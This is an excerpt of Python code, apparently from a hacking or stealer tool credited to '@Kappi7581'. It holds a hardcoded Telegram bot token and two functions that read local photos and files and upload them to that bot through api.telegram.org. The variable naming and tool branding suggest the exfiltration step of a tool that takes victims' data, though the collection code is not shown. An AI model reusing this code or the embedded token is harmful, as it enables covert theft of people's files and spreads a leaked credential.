...
INSTASIFRE = "7413581763:AAFwg4xvJsMgcSehTUgOO-Vu6OCk8Rlo-N8"
...
def send_photo(photo_path):
    ...
    url = f"https://api.telegram.org/bot{INSTASIFRE}/sendPhoto"
    with open(photo_path, 'rb') as photo_file:
        files = {'photo': photo_file}
        data = {'ID': ID, 'caption': 'TOOL BY :@Kappi7581 -'}
        requests.post(url, files=files, data=data)

def send_file(file_path):

    url = f"https://api.telegram.org/bot{INSTASIFRE}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'ID': ID, 'caption': 'By @Kappi7581'}
        requests.post(url, files=files, data=data)
